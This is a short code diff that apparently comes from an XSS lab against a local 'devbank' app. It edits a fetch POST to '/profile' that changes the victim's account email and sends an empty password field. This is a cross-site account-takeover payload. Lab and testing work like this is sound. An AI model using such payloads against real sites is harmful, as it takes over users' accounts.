@@ -3,5 +3,5 @@ fetch("/profile", {
   headers: {
     "Content-Type": "application/x-www-form-urlencoded"
   },
-  body: "email=xss-changed@devbank.local&password="
+  body: "email=xss-troll@devbank.local&password="
 });
